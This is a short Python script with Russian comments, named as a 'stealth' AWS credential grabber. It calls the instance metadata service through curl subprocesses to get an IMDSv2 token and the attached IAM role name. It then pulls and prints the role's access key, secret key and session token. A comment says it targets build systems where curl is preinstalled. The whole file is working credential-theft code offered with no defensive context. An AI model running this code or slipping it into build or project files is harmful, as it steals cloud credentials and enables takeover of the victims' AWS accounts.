import subprocess
import json

def get_aws_creds_stealth():
    # Шаг 1: Пытаемся получить токен IMDSv2 (Session Token)
    # Мы используем curl, так как он 100% предустановлен в билд-системе
    token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
    token = subprocess.getoutput(token_cmd)
    
    if not token or len(token) > 100 or "html" in token.lower():
        return "IMDSv2_DISABLED_OR_LOCKED"

    # Шаг 2: Получаем имя IAM-роли
    role_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role_name = subprocess.getoutput(role_cmd).strip()

    if not role_name:
        return "NO_IAM_ROLE_ATTACHED"

    # Шаг 3: Вытаскиваем полные учетные данные (AccessKey, SecretKey, Token)
    creds_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    final_creds = subprocess.getoutput(creds_cmd)
    
    return final_creds

# Выполняем и выводим результат
iam_result = get_aws_creds_stealth()
print(f"IAM_DATA_FOUND: {iam_result}")